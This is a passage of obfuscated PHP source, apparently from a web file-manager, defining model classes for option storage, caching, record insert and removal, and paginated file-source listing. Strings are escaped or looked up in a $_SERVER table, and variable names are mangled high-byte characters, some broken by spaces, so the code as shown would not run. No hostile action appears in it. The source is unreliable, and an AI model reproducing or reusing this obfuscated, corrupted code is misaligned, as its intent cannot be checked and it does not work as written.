$this->parseOrder(!empty($Î›”€óÇ[$Šô£áÌÇ[441]]) ? $Î›”€óÇ[$Šô£áÌÇ[441]] : $Šô£áÌÇ[12]), $this->parseLimit(!empty($Î›”€óÇ[$Šô£áÌÇ[368]]) ? $Î›”€óÇ[$Šô£áÌÇ[368]] : $Šô£áÌÇ[12]), $this->parseUnion(!empty($Î›”€óÇ[$Šô£áÌÇ[422]]) ? $Î›”€óÇ[$Šô£áÌÇ[422]] : $Šô£áÌÇ[12]), $this->parseComment(!empty($Î›”€óÇ[$Šô£áÌÇ[429]]) ? $Î›”€óÇ[$Šô£áÌÇ[429]] : $Šô£áÌÇ[12])), $ŞÔøÄÌë); return $ŞÔøÄÌë; } public function getLastSql($ãç°çê‘ = '') { return $ãç°çê‘ ? $this->modelSql[$ãç°çê‘] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($‹âôÙÀ„) { return addslashes($‹âôÙÀ„); } public function setModel($‹¹®¸–­) { $this->model = $‹¹®¸–­; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto bŸØğŠØöß; b‡È£á¹éè: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\x65\155\x4f\160\x74\x69\157\156"; public $field = array(); public function listData($ò¦˜½Ë• = false, $ËØõ„Ò = "\155\x6f\x64\151\146\x79\x54\151\x6d\145", $Ç’ªÃŠ = false) { $éóí¡ıŞ =& $_SERVER[µÅ˜º…æ]; $€å£Ö = Model($this->modelType)->get(!1, $this->optionType, !0); $à®äÏˆ‡ = array_values($€å£Ö); if ($à®äÏˆ‡ && $à®äÏˆ‡[0] && !is_array($à®äÏˆ‡[0])) { Model($this->modelType)->cacheRemove($this->optionType); $€å£Ö = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$€å£Ö) { return $ò¦˜½Ë• ? null : array(); } if (!$ò¦˜½Ë• && $ò¦˜½Ë• !== $éóí¡ıŞ[228]) { $€å£Ö = array_filter(array_values($€å£Ö)); return array_sort_by($€å£Ö, $ËØõ„Ò, $Ç’ªÃŠ, $éóí¡ıŞ[487]); } return $€å£Ö[$éóí¡ıŞ[488] . $ò¦˜½Ë•]; } public function insert($ì÷±Ö²ğ) { $áÏü¸€§ =& $_SERVER[µÅ˜º…æ]; $ì÷±Ö²ğ = array_field_key($ì÷±Ö²ğ, $this->field); $€Ç¤Ñ²ƒ = Model($this->modelType)->get($áÏü¸€§[489], $this->optionType . $áÏü¸€§[490]); $€Ç¤Ñ²ƒ = $€Ç¤Ñ²ƒ ? $€Ç¤Ñ²ƒ : 0; $ì÷±Ö²ğ[$áÏü¸€§[487]] = ++$€Ç¤Ñ²ƒ; $ì÷±Ö²ğ[$áÏü¸€§[231]] = time(); $ì÷±Ö²ğ[$áÏü¸€§[88]] = time(); Model($this->modelType)->set($áÏü¸€§[489], $€Ç¤Ñ²ƒ, $this->optionType . $áÏü¸€§[490]); Model($this->modelType)->set($áÏü¸€§[488] . $€Ç¤Ñ²ƒ, $ì÷±Ö²ğ, $this->optionType); return $€Ç¤Ñ²ƒ; } public function insertArr($å©ŸäÜğ) { $ÈØÈ¾Ğñ =& $_SERVER[µÅ˜º…æ]; if (!$å©ŸäÜğ || !is_array($å©ŸäÜğ)) { return !1; } $âÊ°‚À‰ = Model($this->modelType)->get($ÈØÈ¾Ğñ[489], $this->optionType . $ÈØÈ¾Ğñ[490]); $âÊ°‚À‰ = $âÊ°‚À‰ ? $âÊ°‚À‰ : 0; $Æº®îË­ = array(); foreach ($å©ŸäÜğ as $ÃÂ¿ˆÁ”) { $˜…ËŞ£Ã = array_field_key($ÃÂ¿ˆÁ”, $this->field); $˜…ËŞ£Ã[$ÈØÈ¾Ğñ[487]] = ++$âÊ°‚À‰; $˜…ËŞ£Ã[$ÈØÈ¾Ğñ[231]] = time(); $˜…ËŞ£Ã[$ÈØÈ¾Ğñ[88]] = time(); $Æº®îË­[$ÈØÈ¾Ğñ[488] . $âÊ°‚À‰] = $˜…ËŞ£Ã; } Model($this->modelType)->set($ÈØÈ¾Ğñ[489], $âÊ°‚À‰, $this->optionType . $ÈØÈ¾Ğñ[490]); Model($this->modelType)->set($Æº®îË­, !1, $this->optionType); return $âÊ°‚À‰; } public function update($Ğ¡³, $ößö²¥) { $éõÀ“á =& $_SERVER[µÅ˜º…æ]; $ößö²¥ = array_field_key($ößö²¥, $this->field); $‰©Ïğ­ = $this->listData($Ğ¡³); if (!$‰©Ïğ­ || !$Ğ¡³) { return !1; } $ößö²¥ = array_merge($‰©Ïğ­, $ößö²¥); $ößö²¥[$éõÀ“á[88]] = time(); return Model($this->modelType)->set($éõÀ“á[488] . $Ğ¡³, $ößö²¥, $this->optionType); } public function remove($Ä‡Ğ×§ğ) { if (!$Ä‡Ğ×§ğ) { return !1; } return Model($this->modelType)->remove($_SERVER[µÅ˜º…æ][488] . $Ä‡Ğ×§ğ, $this->optionType); } public function removeArr($Õê¡²â) { if (!$Õê¡²â) { return !0; } $¯œ®î´Â = array(); foreach ($Õê¡²â as $§…Ø²©¬) { $¯œ®î´Â[] = $_SERVER[µÅ˜º…æ][488] . $§…Ø²©¬; } return Model($this->modelType)->removeArr($¯œ®î´Â, $this->optionType); } public function clear() { $óçö•Ï =& $_SERVER[µÅ˜º…æ]; Model($this->modelType)->remove($óçö•Ï[489], $this->optionType . $óçö•Ï[490]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¿†³ÖòÇ, $“û˜ø¤²) { if (!$“û˜ø¤²) { return !1; } $‰ÛµøÔß = $this->listData(); $‰ÛµøÔß = array_to_keyvalue($‰ÛµøÔß, $¿†³ÖòÇ); return isset($‰ÛµøÔß[$“û˜ø¤²]) ? $‰ÛµøÔß[$“û˜ø¤²] : !1; } public function findByName($íÙ®û—) { return $this->findByKey($_SERVER[µÅ˜º…æ][32], $íÙ®û—); } protected function resetData($íêÅÚô²) { $¼ÒƒµĞ =& $_SERVER[µÅ˜º…æ]; if (!$íêÅÚô²) { return; } $íêÅÚô² = is_array($íêÅÚô²) ? $íêÅÚô² : array(); $µí³€› = array(); for ($Õ„Ó±…€ = 0; $Õ„Ó±…€ < count($íêÅÚô²); $Õ„Ó±…€++) { if (!$íêÅÚô²[$Õ„Ó±…€] || !$íêÅÚô²[$Õ„Ó±…€][$¼ÒƒµĞ[487]]) { continue; } $µí³€›[$¼ÒƒµĞ[488] . $íêÅÚô²[$Õ„Ó±…€][$¼ÒƒµĞ[487]]] = $íêÅÚô²[$Õ„Ó±…€]; } return Model($this->modelType)->set($µí³€›, !1, $this->optionType); } private function getAutoName($™˜«§ùÆ) { $º¨”±™… = array_to_keyvalue($this->listData(), $_SERVER[µÅ˜º…æ][32]); if (!$º¨”±™… || !isset($º¨”±™…[$™˜«§ùÆ])) { return $™˜«§ùÆ; } for ($Ô½‡Û‰Ô = 1; $Ô½‡Û‰Ô < count($º¨”±™…); $Ô½‡Û‰Ô++) { $çÎÊ™îø = $™˜«§ùÆ . "\x28{$Ô½‡Û‰Ô}\51"; if (!isset($º¨”±™…[$çÎÊ™îø])) { return $çÎÊ™îø; } } return $çÎÊ™îø; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ï¸ò×Ö = false, $’µÍÎÌª = '', $÷ğ¾Óë‘ = false, $ş‚ÎØô = true) { $èóÖ­Ò¢ =& $_SERVER[µÅ˜º…æ]; $‡ïè¹¸¦ = $this->cacheGet($’µÍÎÌª); $ÓË¶¦ ± = $this->optionDefault($’µÍÎÌª); $ÓË¶¦ ± = is_array($ÓË¶¦ ±) ? $ÓË¶¦ ± : array(); if (is_array($‡ïè¹¸¦)) { if ($ş‚ÎØô) { $‡ïè¹¸¦ = array_merge($ÓË¶¦ ±, $‡ïè¹¸¦); } return $Ï¸ò×Ö ? isset($‡ïè¹¸¦[$Ï¸ò×Ö]) ? $‡ïè¹¸¦[$Ï¸ò×Ö] : null : $‡ïè¹¸¦; } $ã˜±ÏÇï = $this->filterWhere(array($èóÖ­Ò¢[33] => $’µÍÎÌª)); $‡ïè¹¸¦ = $this->where($ã˜±ÏÇï)->select(); $‡ïè¹¸¦ = array_to_keyvalue($‡ïè¹¸¦, $èóÖ­Ò¢[95], $èóÖ­Ò¢[451]); foreach ($‡ïè¹¸¦ as $ï“…ç½Î => $ƒÁÃ„û¯) { if ($÷ğ¾Óë‘ || in_array($ï“…ç½Î, $this->jsonField)) { $‡ïè¹¸¦[$ï“…ç½Î] = json_decode($ƒÁÃ„û¯, !0); } } $this->cacheSet($’µÍÎÌª, $‡ïè¹¸¦); if ($ş‚ÎØô) { $‡ïè¹¸¦ = array_merge($ÓË¶¦ ±, $‡ïè¹¸¦); } return $Ï¸ò×Ö ? $‡ïè¹¸¦[$Ï¸ò×Ö] : $‡ïè¹¸¦; } public function set($º÷·‘Ï¶, $ıÌÎÛ™§ = false, $ÒÒ©Ó½™ = '') { $íÅÀ©ã… =& $_SERVER[µÅ˜º…æ]; if (!$º÷·‘Ï¶) { return !0; } $¸úíÔ’ = $this->get(!1, $ÒÒ©Ó½™, !1, !1); $¸úíÔ’ = is_array($¸úíÔ’) ? $¸úíÔ’ : array(); $Ç£åÀµ® = array(); $å¯¥çüã = array(); $’Ğœ¶ŞÚ = array(); $â°Ä»­Ñ = is_array($º÷·‘Ï¶) ? $º÷·‘Ï¶ : array($º÷·‘Ï¶ => $ıÌÎÛ™§); $ò ×†”ë = $this->filterWhere(array($íÅÀ©ã…[33] => $ÒÒ©Ó½™)); foreach ($â°Ä»­Ñ as $Ë›ÂÙ˜§ => $Ê¶”¤®õ) { if (is_array($Ê¶”¤®õ)) { $Ê¶”¤®õ = json_encode_force($Ê¶”¤®õ); } $this->checkLength($Ê¶”¤®õ, !1, $this->tableName . $íÅÀ©ã…[4] . $º÷·‘Ï¶); $Ê¶”¤®õ = self::textEncode($Ê¶”¤®õ); if (array_key_exists($Ë›ÂÙ˜§, $¸úíÔ’)) { $ü­¹şÛ¦ = is_array($¸úíÔ’[$Ë›ÂÙ˜§]) ? json_encode_force($¸úíÔ’[$Ë›ÂÙ˜§]) : $¸úíÔ’[$Ë›ÂÙ˜§]; $ü­¹şÛ¦ = self::textEncode($ü­¹şÛ¦); if ($ü­¹şÛ¦ === $Ê¶”¤®õ) { continue; } $å¯¥çüã[] = array($íÅÀ©ã…[95], $Ë›ÂÙ˜§, $íÅÀ©ã…[451], $Ê¶”¤®õ, $íÅÀ©ã…[88], time()); } else { $Àïªƒ´ = array($íÅÀ©ã…[33] => $ÒÒ©Ó½™, $íÅÀ©ã…[95] => $Ë›ÂÙ˜§, $íÅÀ©ã…[451] => $Ê¶”¤®õ); $Ç£åÀµ®[] = $this->filterWhere($Àïªƒ´); } } if (!$Ç£åÀµ® && !$å¯¥çüã) { return !0; } $this->cacheRemove($ÒÒ©Ó½™); $ÛñÜøçñ = $this->cacheKey($íÅÀ©ã…[491]); CacheLock::lock($ÛñÜøçñ); if ($Ç£åÀµ®) { $this->addAll($Ç£åÀµ®); } if ($å¯¥çüã) { $this->saveAll($å¯¥çüã, $ò ×†”ë); } CacheLock::unlock($ÛñÜøçñ); return !0; } protected function optionDefault($Ç¥Çˆí = '') { return !1; } public function setDeep($×­Â¸Ì, $û¬„üì• = false, $ÇèŞ¶ğª = '') { $é›öáÂ = explode($_SERVER[µÅ˜º…æ][10], $×­Â¸Ì); $©Ğı£‡‘ = $this->get(); array_set_value($©Ğı£‡‘, $×­Â¸Ì, $û¬„üì•); $this->set($é›öáÂ[0], $©Ğı£‡‘[$é›öáÂ[0]], $ÇèŞ¶ğª); } public function remove($ŒÎü’‡¢, $­ØúÏÅŞ = '') { $ ‹”§§ò =& $_SERVER[µÅ˜º…æ]; $this->cacheRemove($­ØúÏÅŞ); $ÕÍ¼«½  = $this->filterWhere(array($ ‹”§§ò[95] => $ŒÎü’‡¢, $ ‹”§§ò[33] => $­ØúÏÅŞ)); if (is_null($ŒÎü’‡¢)) { unset($ÕÍ¼«½ [$ ‹”§§ò[95]]); } return $this->where($ÕÍ¼«½ )->delete(); } public function removeArr($õ½°Ëû‚, $ÒõÚ›ù = '') { $ÖÁ¥‰ =& $_SERVER[µÅ˜º…æ]; if (!$õ½°Ëû‚ || !is_array($õ½°Ëû‚)) { return !0; } $this->cacheRemove($ÒõÚ›ù); $ƒ…—¦Ÿ¶ = $this->filterWhere(array($ÖÁ¥‰[33] => $ÒõÚ›ù, $ÖÁ¥‰[95] => array($ÖÁ¥‰[7], $õ½°Ëû‚))); return $this->where($ƒ…—¦Ÿ¶)->delete(); } public function cacheSet($ÕŠ”Ô³Õ, $ÌÀÂ€• = false) { return Cache::set($this->cacheKey($ÕŠ”Ô³Õ), $ÌÀÂ€•); } public function cacheGet($§®É»™ë) { return Cache::get($this->cacheKey($§®É»™ë)); } public function cacheRemove($úöìŞÉÑ) { return Cache::remove($this->cacheKey($úöìŞÉÑ)); } protected function filterWhere($üµ€Š) { return $üµ€Š; } protected function cacheKey($‹Âš‰åı) { return $‹Âš‰åı; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\162\x63\x65"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\155\145" => "\151\157\x5f\x73\x6f\x75\162\x63\145\137\x6d\x65\164\141", "\155\145\x74\x61\106\x69\145\x6c\144" => "\163\157\165\162\143\x65\111\x44"); protected $dataAuto = array(array("\155\157\144\151\146\x79\124\x69\155\x65", "\164\151\155\145", "\151\x6e\x73\x65\x72\x74", "\x66\165\x6e\143\x74\x69\157\156"), array("\x63\162\x65\x61\164\x65\124\151\155\x65", "\x74\x69\155\x65", "\151\x6e\x73\x65\x72\x74", "\x66\165\x6e\x63\x74\x69\157\156"), array("\166\x69\x65\x77\x54\151\x6d\x65", "\164\x69\x6d\145", "\x69\156\163\x65\x72\164", "\x66\165\156\143\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($™©íÅ²©) { return $this->listSource(array($_SERVER[µÅ˜º…æ][492] => $™©íÅ²©)); } public function typeName($Ó³ä¶è±) { static $¨ë€œ®Ô = array(self::TYPE_SYSTEM => "\x73\x79\163\164\145\x6d", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\147\x72\157\165\x70"); return $¨ë€œ®Ô[$Ó³ä¶è± . $_SERVER[µÅ˜º…æ][12]]; } public function sourceListInfo($ÀòİÆŸá, $ÓÎ¦’»ô = false) { $¦ŸÙğÆÉ =& $_SERVER[µÅ˜º…æ]; $ÀòİÆŸá = $ÀòİÆŸá ? $ÀòİÆŸá : array(); $ÀòİÆŸá = array_filter(array_unique($ÀòİÆŸá)); if (!$ÀòİÆŸá) { return array(); } $Î»œ£Æ = $this->where(array($¦ŸÙğÆÉ[191] => array($¦ŸÙğÆÉ[7], $ÀòİÆŸá)))->select(); $this->_listDataApply($Î»œ£Æ, $ÓÎ¦’»ô); return array_to_keyvalue($Î»œ£Æ, $¦ŸÙğÆÉ[191]); } public function pathInfoFilter(&$•ığîØä) { $ŸıÔÅ—Á =& $_SERVER[µÅ˜º…æ]; static $õÅŠèˆ» = false; static $œ ½è = false; static $ÅçÕµ®ç = false; if (!$õÅŠèˆ») { $‘–˜Õòı = $ŸıÔÅ—Á[493]; $‘–˜Õòı .= $ŸıÔÅ—Á[494]; $‘–˜Õòı .= $ŸıÔÅ—Á[495]; $ ØÈŞ‡® = $ŸıÔÅ—Á[496]; $•å‡ ï = explode($ŸıÔÅ—Á[50], $ ØÈŞ‡®); $õÅŠèˆ» = explode($ŸıÔÅ—Á[50], $‘–˜Õòı); $œ ½è = array(); foreach ($õÅŠèˆ» as $™ã‡Ğµ†) { if (in_array($™ã‡Ğµ†, $•å‡ ï)) { continue; } $œ ½è[] = $™ã‡Ğµ†; } $ÅçÕµ®ç = explode($ŸıÔÅ—Á[50], $ŸıÔÅ—Á[497]); } foreach ($ÅçÕµ®ç as $†çò‡Ùı) { if (isset($•ığîØä[$†çò‡Ùı])) { $•ığîØä[$†çò‡Ùı] = intval($•ığîØä[$†çò‡Ùı]); } } $•ığîØä[$ŸıÔÅ—Á[87]] = $ŸıÔÅ—Á[498] . $•ığîØä[$ŸıÔÅ—Á[191]] . $ŸıÔÅ—Á[499]; $•ığîØä[$ŸıÔÅ—Á[33]] = $•ığîØä[$ŸıÔÅ—Á[500]] == 1 ? $ŸıÔÅ—Á[78] : $ŸıÔÅ—Á[230]; $•ığîØä[$ŸıÔÅ—Á[188]] = $this->typeName($•ığîØä[$ŸıÔÅ—Á[188]]); if ($•ığîØä[$ŸıÔÅ—Á[500]] != 1) { $•ığîØä[$ŸıÔÅ—Á[166]] = $•ığîØä[$ŸıÔÅ—Á[501]]; unset($•ığîØä[$ŸıÔÅ—Á[501]]); } $Â­“ò = $õÅŠèˆ»; if (isset($•ığîØä[$ŸıÔÅ—Á[502]]) && $•ığîØä[$ŸıÔÅ—Á[502]][$ŸıÔÅ—Á[503]] == -1) { $Â­“ò = $œ ½è; } $•ığîØä = array_field_key($•ığîØä, $Â­“ò); return $•ığîØä; } public function listUserFav() { $…üêÁÂ =& $_SERVER[µÅ˜º…æ]; $øËÜÙ»œ = Model($…üêÁÂ[504])->listData(); $Ğ¨ËÔÚÀ = array_filter_by_field($øËÜÙ»œ, $…üêÁÂ[33], $…üêÁÂ[505]); $Ğ¨ËÔÚÀ = array_to_keyvalue($Ğ¨ËÔÚÀ, $…üêÁÂ[12], $…üêÁÂ[87]); if ($Ğ¨ËÔÚÀ) { $±öé‚êÊ = $this->listSource(array($…üêÁÂ[506] => array($…üêÁÂ[507], $Ğ¨ËÔÚÀ))); } $±öé‚êÊ = array_to_keyvalue($±öé‚êÊ[$…üêÁÂ[446]], $…üêÁÂ[191]); foreach ($øËÜÙ»œ as &$¹¬Ş³–) { $¹¬Ş³– = array($…üêÁÂ[508] => $¹¬Ş³–[$…üêÁÂ[487]], $…üêÁÂ[509] => $¹¬Ş³–[$…üêÁÂ[32]], $…üêÁÂ[510] => $¹¬Ş³–[$…üêÁÂ[87]], $…üêÁÂ[511] => $¹¬Ş³–[$…üêÁÂ[33]], $…üêÁÂ[512] => $¹¬Ş³–[$…üêÁÂ[231]], $…üêÁÂ[513] => $¹¬Ş³–[$…üêÁÂ[88]]); if ($¹¬Ş³–[$…üêÁÂ[33]] == $…üêÁÂ[505] && $±öé‚êÊ[$¹¬Ş³–[$…üêÁÂ[87]]]) { $¹¬Ş³–[$…üêÁÂ[90]] = $±öé‚êÊ[$¹¬Ş³–[$…üêÁÂ[87]]]; } } unset($¹¬Ş³–); return $øËÜÙ»œ; } public function listUserTag($˜ĞúÇç) { $¥ŞëÑÁÎ =& $_SERVER[µÅ˜º…æ]; if ($˜ĞúÇç && !is_array($˜ĞúÇç)) { $˜ĞúÇç = array($˜ĞúÇç); } $«¡óÃÜ = Model($¥ŞëÑÁÎ[514])->listData(); $ã¶‰·æ» = array(); $‡ÁÛ§´Ô = array(); foreach ($«¡óÃÜ as $Åñ÷¸€) { $Îà‰É½‹ = $Åñ÷¸€[$¥ŞëÑÁÎ[87]]; if (!$Îà‰É½‹) { continue; } if (!isset($‡ÁÛ§´Ô[$Îà‰É½‹])) { $‡ÁÛ§´Ô[$Îà‰É½‹] = array(); } $‡ÁÛ§´Ô[$Îà‰É½‹][] = $Åñ÷¸€[$¥ŞëÑÁÎ[515]]; $ã¶‰·æ»[$Åñ÷¸€[$¥ŞëÑÁÎ[87]]] = $Åñ÷¸€; } $æÖÒ´’ø = array(); $œü³ÃùŸ = array(); $œ®áˆè¤ = array(); foreach ($‡ÁÛ§´Ô as $ ÷àéŸ× => $½ï×¨À–) { $‘îµÂ™› = !0; if (!$˜ĞúÇç) { $æÖÒ´’ø[] = $ ÷àéŸ×; continue; } foreach ($˜ĞúÇç as $ß˜Çáî‡) { if (!in_array($ß˜Çáî‡, $½ï×¨À–)) { $‘îµÂ™› = !1; break; } } if (!$‘îµÂ™›) { continue; } if (!is_numeric($ ÷àéŸ×)) { $ÈŒå¯ş = $ã¶‰·æ»[$ ÷àéŸ×]; $ÙÎÚ÷¿Ç = array($¥ŞëÑÁÎ[32] => $ÈŒå¯ş[$¥ŞëÑÁÎ[32]], $¥ŞëÑÁÎ[87] => $ÈŒå¯ş[$¥ŞëÑÁÎ[87]], $¥ŞëÑÁÎ[33] => $ÈŒå¯ş[$¥ŞëÑÁÎ[33]], $¥ŞëÑÁÎ[90] => array($¥ŞëÑÁÎ[516] => 1), $¥ŞëÑÁÎ[232] => !0); if ($ÈŒå¯ş[$¥ŞëÑÁÎ[33]] == $¥ŞëÑÁÎ[230]) { $œ®áˆè¤[] = $ÙÎÚ÷¿Ç; } if ($ÈŒå¯ş[$¥ŞëÑÁÎ[33]] == $¥ŞëÑÁÎ[78]) { $œü³ÃùŸ[] = $ÙÎÚ÷¿Ç; } continue; } $æÖÒ´’ø[] = $ ÷àéŸ×; } if ($æÖÒ´’ø) { $ò•‘Á¿‘ = $this->listSource(array($¥ŞëÑÁÎ[506] => array($¥ŞëÑÁÎ[507], $æÖÒ´’ø))); } $ò•‘Á¿‘ = $ò•‘Á¿‘ ? $ò•‘Á¿‘ : array($¥ŞëÑÁÎ[85] => array(), $¥ŞëÑÁÎ[86] => array()); $ò•‘Á¿‘[$¥ŞëÑÁÎ[85]] = array_merge($ò•‘Á¿‘[$¥ŞëÑÁÎ[85]], $œü³ÃùŸ); $ò•‘Á¿‘[$¥ŞëÑÁÎ[86]] = array_merge($ò•‘Á¿‘[$¥ŞëÑÁÎ[86]], $œ®áˆè¤); if (isset($ò•‘Á¿‘[$¥ŞëÑÁÎ[443]]) && count($æÖÒ´’ø) == $ò•‘Á¿‘[$¥ŞëÑÁÎ[443]][$¥ŞëÑÁÎ[444]]) { return $ò•‘Á¿‘; } $Èğù§·¨ = array(); $•ìÍ“º = array_to_keyvalue($ò•‘Á¿‘[$¥ŞëÑÁÎ[85]], $¥ŞëÑÁÎ[12], $¥ŞëÑÁÎ[191]); $İ¬°Ó¹ = array_to_keyvalue($ò•‘Á¿‘[$¥ŞëÑÁÎ[86]], $¥ŞëÑÁÎ[12], $¥ŞëÑÁÎ[191]); $±Í¿õ£è = array_merge($İ¬°Ó¹, $•ìÍ“º); foreach ($æÖÒ´’ø as $Îà‰É½‹) { if (!in_array($Îà‰É½‹, $±Í¿õ£è)) { $Èğù§·¨[] = $Îà‰É½‹; } } if ($Èğù§·¨) { Model($¥ŞëÑÁÎ[517])->removeBySource($Èğù§·¨); } return $ò•‘Á¿‘; } public function listUserRecycle() { $Èõ»öáƒ =& $_SERVER[µÅ˜º…æ]; $ÅœœñâÉ = Model($Èõ»öáƒ[518])->listData(); if (!$ÅœœñâÉ) { return array(); } $­«â‹Ù‹ = array($Èõ»öáƒ[506] => array($Èõ»öáƒ[507], $ÅœœñâÉ), $Èõ»öáƒ[519] => 1); return $this->listSource($­«â‹Ù‹); } public function listSource($‰†íÅ›÷, $…€Âøí– = 3000, $Ÿ”‰Ñêå = false) { $ÄÂ•Ë´— =& $_SERVER[µÅ˜º…æ]; if (!isset($‰†íÅ›÷[$ÄÂ•Ë´—[520]])) { $‰†íÅ›÷[$ÄÂ•Ë´—[520]] = 0; } if (isset($‰†íÅ›÷[$ÄÂ•Ë´—[190]]) && $‰†íÅ›÷[$ÄÂ•Ë´—[190]] == $ÄÂ•Ë´—[228]) { $‰†íÅ›÷[$ÄÂ•Ë´—[501]] = array($ÄÂ•Ë´—[464], $ÄÂ•Ë´—[12]); } if (isset($‰†íÅ›÷[$ÄÂ•Ë´—[190]])) { $‰†íÅ›÷[$ÄÂ•Ë´—[190]] = intval($‰†íÅ›÷[$ÄÂ•Ë´—[190]]); } $‚¼£ÌÅÛ = $ÄÂ•Ë´—[521]; $Ÿ…ÀŠİ = $this->field($‚¼£ÌÅÛ)->_makeOrder()->where($‰†íÅ›÷)->selectPage($…€Âøí–); $this->_listPageCheck($Ÿ…ÀŠİ, $‚¼£ÌÅÛ, $‰†íÅ›÷); $this->_listDataApply($Ÿ…ÀŠİ[$ÄÂ•Ë´—[446]], $Ÿ”‰Ñêå); $this->_listMake($Ÿ…ÀŠİ); return $Ÿ…ÀŠİ; } private function _listPageCheck(&$Î—÷íä , $°ˆÎ³Êƒ, $ã¨›€‹ú) { $¦¦œÍ¶© =& $_SERVER[µÅ˜º…æ]; if (!is_array($Î—÷íä [$¦¦œÍ¶©[443]])) { return; } $ĞÑÂ×‹ù = $Î—÷íä [$¦¦œÍ¶©[443]]; if ($ĞÑÂ×‹ù[$¦¦œÍ¶©[445]] <= 1) { return; } if ($ĞÑÂ×‹ù[$¦¦œÍ¶©[444]] >= 100000) { return; } if (Model($¦¦œÍ¶©[522])->get($¦¦œÍ¶©[523]) != $¦¦œÍ¶©[524]) { return; } $°ˆÎ³Êƒ = str_replace(array($¦¦œÍ¶©[53], $¦¦œÍ¶©[417], $¦¦œÍ¶©[285]), $¦¦œÍ¶©[12], $°ˆÎ³Êƒ); $°ˆÎ³Êƒ = $¦¦œÍ¶©[525] . str_replace($¦¦œÍ¶©[50], $¦¦œÍ¶©[526], $°ˆÎ³Êƒ) . $¦¦œÍ¶©[527]; $œÛë‡• = $¦¦œÍ¶©[528]; $œÛë‡• = $œÛë‡• . $¦¦œÍ¶©[529]; $¯¤¤½×Ô = $ĞÑÂ×‹ù[$¦¦œÍ¶©[439]] * ($ĞÑÂ×‹ù[$¦¦œÍ¶©[428]] - 1) . $¦¦œÍ¶©[50] . $ĞÑÂ×‹ù[$¦¦œÍ¶©[439]]; $Ò¼ˆóÛ± = $this->_makeOrder(!0); $¹õÂæ° = $¦¦œÍ¶©[525] . str_replace($¦¦œÍ¶©[50], $¦¦œÍ¶©[526], $Ò¼ˆóÛ±[0]); if (strpos($¹õÂæ°, $¦¦œÍ¶©[530])) { $¹õÂæ° = str_replace($¦¦œÍ¶©[530], $¦¦œÍ¶©[531], $¹õÂæ°); } else { $¹õÂæ° .= $¦¦œÍ¶©[532] . $Ò¼ˆóÛ±[1]; } $÷±êª”û = array(); foreach ($ã¨›€‹ú as $Ú±ß“üÛ => $Ç¸’°‚Í) { $÷±êª”û[$¦¦œÍ¶©[525] . $Ú±ß“üÛ] = $Ç¸’°‚Í; } $this->alias($¦¦œÍ¶©[533])->field($°ˆÎ³Êƒ)->limit($¯¤¤½×Ô)->order($¹õÂæ°); $ı‚Ã¢¸½ = $this->join($œÛë‡•)->where($÷±êª”û)->select(); if ($ı‚Ã¢¸½) { $Î—÷íä [$¦¦œÍ¶©[446]] = $ı‚Ã¢¸½; } } protected function _makeOrder($£Óß§óÄ = false) { $¼®¯ÛÌ‘ =& $_SERVER[µÅ˜º…æ]; $ËµÕøç = Model($¼®¯ÛÌ‘[534])->get($¼®¯ÛÌ‘[535]); $àÖ¹òİœ = Model($¼®¯ÛÌ‘[534])->get($¼®¯ÛÌ‘[536]); $«¬‰ŠÂ” = array($¼®¯ÛÌ‘[537] => $¼®¯ÛÌ‘[538], $¼®¯ÛÌ‘[539] => $¼®¯ÛÌ‘[540]); $ŞîêÒó = array($¼®¯ÛÌ‘[32] => $¼®¯ÛÌ‘[32], $¼®¯ÛÌ‘[79] => $¼®¯ÛÌ‘[79], $¼®¯ÛÌ‘[166] => $¼®¯ÛÌ‘[501], $¼®¯ÛÌ‘[541] => $¼®¯ÛÌ‘[541], $¼®¯ÛÌ‘[542] => $¼®¯ÛÌ‘[543], $¼®¯ÛÌ‘[231] => $¼®¯ÛÌ‘[231], $¼®¯ÛÌ‘[88] => $¼®¯ÛÌ‘[88]); $¿ÀìíÄ = Input::get($¼®¯ÛÌ‘[544], $¼®¯ÛÌ‘[7], $ËµÕøç, array_keys($ŞîêÒó)); $Ë£”—è = Input::get($¼®¯ÛÌ‘[545], $¼®¯ÛÌ‘[7], $àÖ¹òİœ, array_keys($«¬‰ŠÂ”)); if (!in_array($¿ÀìíÄ, array_keys($ŞîêÒó))) { $¿ÀìíÄ = $¼®¯ÛÌ‘[32]; } if (!in_array($Ë£”—è, array_keys($«¬‰ŠÂ”))) { $¿ÀìíÄ = $¼®¯ÛÌ‘[537]; } if ($¿ÀìíÄ == $¼®¯ÛÌ‘[32]) { } $Çé•€–© = $¼®¯ÛÌ‘[546] . $ŞîêÒó[$¿ÀìíÄ] . $¼®¯ÛÌ‘[53] . $«¬‰ŠÂ”[$Ë£”—è]; $Çé•€–© = rtrim(trim($Çé•€–©), $¼®¯ÛÌ‘[50]); if ($£Óß§óÄ) { return array($Çé•€–©, $«¬‰ŠÂ”[$Ë£”—è]); } return $this->order($Çé•€–©); } protected function _listDataApplyItem($ôºçÜâ, $µ¡Ç¢ì³ = false) { $˜®ô—³ş = array($ôºçÜâ); $this->_listDataApply($˜®ô—³ş, $µ¡Ç¢ì³); return $˜®ô—³ş[0]; } protected function _listDataApply(&$æÃìéŒ³, $ÃÙışœÀ = false) { $É§ïæÇ’ =& $_SERVER[µÅ˜º…æ]; if (!$æÃìéŒ³) { $æÃìéŒ³ = array(); return; } $ûõÇ§ôŞ = array_to_keyvalue($æÃìéŒ³, $É§ïæÇ’[12], $É§ïæÇ’[191]); $ûõÇ§ôŞ = array_unique($ûõÇ§ôŞ); $ûõÇ§ôŞ = array_to_int($ûõÇ§ôŞ); $this->_listSourceCache($æÃìéŒ³); if (!$ÃÙışœÀ) { $this->_listAppendMeta($æÃìéŒ³, $ûõÇ§ôŞ); 